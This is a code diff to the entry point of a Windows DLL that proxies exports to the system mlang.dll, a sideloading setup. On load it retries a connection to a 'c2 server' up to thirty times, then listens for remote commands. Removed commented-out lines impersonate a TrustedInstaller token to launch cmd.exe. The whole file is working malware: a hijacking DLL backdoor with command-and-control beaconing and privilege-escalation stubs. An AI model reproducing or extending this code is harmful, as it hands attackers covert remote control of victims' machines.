@@ -1,10 +1,8 @@
 // dllmain.cpp : Defines the entry point for the DLL application.
 #include "ProcessManager.h"
-#include "Syscalls.h"
 #include "Client.h"
 #include "NetworkCommon.h"
 
-#include <thread>
 
 #pragma comment(linker, "/export:IsConvertINetStringAvailable=C:\\Windows\\System32\\mlang.IsConvertINetStringAvailable,@110")
 #pragma comment(linker, "/export:ConvertINetString=C:\\Windows\\System32\\mlang.ConvertINetString,@111")
@@ -26,47 +24,35 @@
 int _x = 0;
 #pragma data_seg()
 
+const unsigned int MAX_CON_ATTEMPTS = 30; // how many times to try and send conection requuests to udp and tcp
+unsigned int connectionAttempts = 0;
 
 BOOL APIENTRY DllMain(HMODULE hModule,
-					  DWORD  ul_reason_for_call,
-					  LPVOID lpReserved
+                      DWORD  ul_reason_for_call,
+                      LPVOID lpReserved
 )
 {
-	switch ( ul_reason_for_call )
-	{
-	case DLL_PROCESS_ATTACH:		
-		std::unique_ptr<Client> me = std::make_unique<Client>();
+    switch ( ul_reason_for_call )
+    {
+    case DLL_PROCESS_ATTACH:        
+        std::unique_ptr<Client> me = std::make_unique<Client>();
+        BOOL connected = FALSE;
 
-		// try to connect to c2 server
-		if ( !me->Connect() )
-			me->~Client();
+        do {
+            // try to connect to c2 server
+            connected = me->Connect();
+            connectionAttempts++;
+            Sleep(300000); // second interval before connecting again
+        } while ( connected == FALSE && connectionAttempts < MAX_CON_ATTEMPTS );
 
-		//ProcessManager mgr;
-		//mgr.GetTrustedInstallerToken();
-		//STARTUPINFO si = { 0 };
-		//PROCESS_INFORMATION pi = { 0 };
-		//std::wstring inp(L"C:\\Windows\\System32\\cmd.exe /K whoami");
+        // failed.
+        if ( connected == FALSE && connectionAttempts >= MAX_CON_ATTEMPTS )
+            break;
 
-		//mgr.OpenProcessAsImposter(
-		//	mgr.GetToken(),
-		//	0,
-		//	NULL,
-		//	inp.data(),
-		//	CREATE_NEW_CONSOLE,
-		//	NULL,
-		//	NULL,
-		//	&si,
-		//	&pi
-		//);
+        me->ListenForServerCommands();
 
-		me->ListenForServerCommands();
-
-		while ( 1 ) {
-			Sleep(1000);
-		}
-
-		break;
-	}
-	return TRUE;
+        break;
+    }
+    return TRUE;
 }
 
